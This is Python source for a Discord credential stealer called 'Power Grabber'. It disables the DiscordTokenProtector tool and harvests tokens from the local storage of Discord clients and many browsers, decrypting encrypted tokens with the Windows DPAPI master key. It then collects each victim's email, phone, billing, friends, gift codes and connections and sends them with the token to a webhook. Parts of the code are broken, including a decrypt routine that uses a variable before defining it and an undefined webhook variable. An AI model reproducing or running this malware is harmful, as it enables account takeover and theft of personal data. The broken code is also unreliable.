import subprocess
import sys
import os
import base64
import json
import re
import requests
from win32crypt import CryptUnprotectData
from PIL import ImageGrab
from datetime import datetime
class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.killprotector()
        self.grabTokens()
    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
        if not os.path.exists(path):
            return
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    def grabTokens(self):
        paths = {
    'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
    'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
    'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
    'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
    'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
    'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
    'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
    'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
    'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
    'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
    'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
    '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
    'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
    'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
    'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
    'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
    'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
    'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
    'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
    'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
    'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
    'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
    'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
    'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\',
    'Firefox': self.roaming + '\\Mozilla\\Firefox\\Profiles\\<profile-folder>\\storage\\default\\',
        }
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
    def upload(self, webhook_url):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue
            val = ""
            methods = ""
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
            guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
            gift_codes = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers).json()
            connections = requests.get("https://discord.com/api/v9/users/@me/connections", headers=headers).json()            
            friend_count = len([f for f in friends if f['type'] == 1])
            guild_count = len(guilds)
            connection_count = len(connections)            
            username = user['username'] + "#" + user.get('discriminator', '0000')
            blocked_count = len([f for f in friends if f['type'] == 2])
            blocked_users = [f'{f["user"]["username"]}#{f["user"]["discriminator"]}' for f in friends if f['type'] == 2]
            discord_id = user['id']
            avatar_url = (
                f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif"
                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200
                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            )
            phone = user['phone'] if user.get('phone') else ":x:"
            email = user['email']
            language = user.get('locale', 'en-US').split('-')[0]
            mfa = ":white_check_mark:" if user.get('mfa_enabled') else ":x:"
            creation_date = datetime.utcfromtimestamp(((int(discord_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            premium_types = {
                0: ":x:",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }
            nitro = premium_types.get(user.get('premium_type'), ":x:")
            nitro_since = user.get('premium_since', 'N/A')            
            if "message" in payment or payment == []:
                methods = ":x:"
            gift_codes_str = "\n".join([f"Code: {code['code']} | {code['promotion']['outbound_title']}" for code in gift_codes]) if gift_codes else "No gift codes"
            connections_str = "\n".join([f"{conn['type']}: {conn['name']}" for conn in connections]) if connections else "No connections"
            flags = user.get('public_flags', 0)
            badges = []
            if flags & 1: badges.append("<:staff:969573862939975700>")
            if flags & 2: badges.append("<:partner:969573863162085376>")
            if flags & 4: badges.append("<:hypesquad_events:969573862906425344>")
            if flags & 8: badges.append("<:bughunter_1:969573862840082443>")
            if flags & 64: badges.append("<:Bravery:1314700385260277800>")
            if flags & 128: badges.append("<:brilliance:969573862735224852>")
            if flags & 256: badges.append("<:balance:969573862550659092>")
            if flags & 512: badges.append("<:early_supporter:969573862906429440>")
            if flags & 16384: badges.append("<:bughunter_2:969573862840082443>")
            if flags & 131072: badges.append("<:developer:969573862926577675>")
            if flags & 4194304: badges.append("<:active_developer:1042545590640324608>")
            badge_str = " ".join(badges) if badges else "No Badges"
            data = {
                "embeds": [
                    {
                        "title": "((✨POWER GRABBER✨))",
                        "username": "Power Grabber",
                        "color": 0x8B0000,
                        "fields": [
                            {
                                "name": "🪪Discord ID:",
                                "value": f"`{discord_id}`"
                            },
                            {
                                "name": "<:Email:1314700420152692746>Email:",
                                "value": f"`{email}`"
                            },
                            {
                                "name": "📱Phone:",
                                "value": f"`{phone}`"
                            },
                            {
                                "name": "🔐2FA:",
                                "value": f"{mfa}"
                            },
                            {
                                "name": "<:Nitro:1314700484032069695>Nitro Info:",
                                "value": f"{nitro}\nNitro Since:\n{nitro_since}"
                            },
                            {
                                "name": "💳Billing:",
                                "value": f"{methods}"
                            },
                            {
                                "name": "🗝️Token:",
                                "value": f"`{token}`"
                            },
                            {
                                "name": "👤Username:",
                                "value": f"`{username}`"
                            },
                            {
                                "name": "🏅Badges:",
                                "value": f"{badge_str}"
                            },
                            {
                                "name": "👥Number of Friends:",
                                "value": f"{friend_count}"
                            },
                            {
                                "name": "📆Account creation date:",
                                "value": f"{creation_date}"
                            },
                            {
                                "name": "🔗Connections:",
                                "value": f"{connections_str}"
                            },
                            {
                                "name": "🎁Gift Codes:",
                                "value": f"{gift_codes_str}"
                            },
                            {
                                "name": "🗣️Account langauage:",
                                "value": f"{language}"
                            },
                            {
                                "name": "⚙️Server count:",
                                "value": f"{guild_count}"
                            },
                            {
                                "name": "🚫Number of users blocked:",
                                "value": f"{blocked_count}"
                            },
                            {
                              "name": "💻 the code:",
                                "value": f"[**`Click here for the code`**](https://github.com/Powercascade/Power-grabber)"
                            },
                            {
                                "name": "<:Skull:1288242523776483359>Join Power's discord:",
                                "value": f"[**`Join, NOW`**](https://discord.gg/Zsyhg7YYKV)"
                            },
                            {
                                "name": "📸Download the user's pfp:",
                                "value": f"[**`Click to Download`**]({avatar_url})"
                            },
                            {
                                "name": " ",
                                "value": f"Power Grabber | Made by Powercascade and Taktikal.exe"
                            }
                        ],
                        "thumbnail": {
                            "url": avatar_url},
                    }
                ],
            }
            requests.post(webhook_url, json=data)
            self.tokens_sent.append(token)
discord_grabber = Discord()
discord_grabber.upload(webhook_url)
